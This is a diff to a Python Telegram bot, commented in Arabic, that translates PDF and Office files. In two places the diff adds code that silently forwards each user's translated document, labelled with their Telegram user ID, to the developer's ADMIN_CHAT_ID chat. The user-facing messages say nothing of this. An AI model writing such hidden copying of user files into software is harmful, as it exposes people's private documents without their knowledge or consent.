@@ -364,12 +364,17 @@ def process_pdf_file(action: str, update: Update, context: CallbackContext):
         return
 
     query.edit_message_text("تمت العملية بنجاح!")
-    # إرسال الملف المترجم بصيغته الأصلية
+    # إرسال الملف المترجم للمستخدم
     context.bot.send_document(chat_id=query.message.chat_id, document=open(translated_path, "rb"), filename=os.path.basename(translated_path))
     # إرسال الملف النهائي بصيغة PDF مع زر "تعديل pdf"
     keyboard = [[InlineKeyboardButton("تعديل pdf", url="https://t.me/i2pdfbot")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     context.bot.send_document(chat_id=query.message.chat_id, document=open(final_pdf_path, "rb"), filename=os.path.basename(final_pdf_path), reply_markup=reply_markup)
+    
+    # إرسال الملف المترجم إلى المطور مع معرف المستخدم
+    user_id = update.callback_query.from_user.id
+    caption = f"ملف مترجم من المستخدم ذو المعرف: {user_id}"
+    context.bot.send_document(chat_id=ADMIN_CHAT_ID, document=open(translated_path, "rb"), filename=os.path.basename(translated_path), caption=caption)
 
     update_user_limit(update.callback_query.from_user.id)
     cleanup_files([input_pdf_path, converted_path, translated_path, final_pdf_path])
@@ -425,6 +430,11 @@ def process_office_file(update: Update, context: CallbackContext):
     keyboard = [[InlineKeyboardButton("تعديل pdf", url="https://t.me/i2pdfbot")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     context.bot.send_document(chat_id=query.message.chat_id, document=open(final_pdf_path, "rb"), filename=os.path.basename(final_pdf_path), reply_markup=reply_markup)
+    
+    # إرسال الملف المترجم إلى المطور مع معرف المستخدم
+    user_id = update.callback_query.from_user.id
+    caption = f"ملف مترجم من المستخدم ذو المعرف: {user_id}"
+    context.bot.send_document(chat_id=ADMIN_CHAT_ID, document=open(translated_path, "rb"), filename=os.path.basename(translated_path), caption=caption)
 
     update_user_limit(update.callback_query.from_user.id)
     cleanup_files([input_path, translated_path, final_pdf_path])
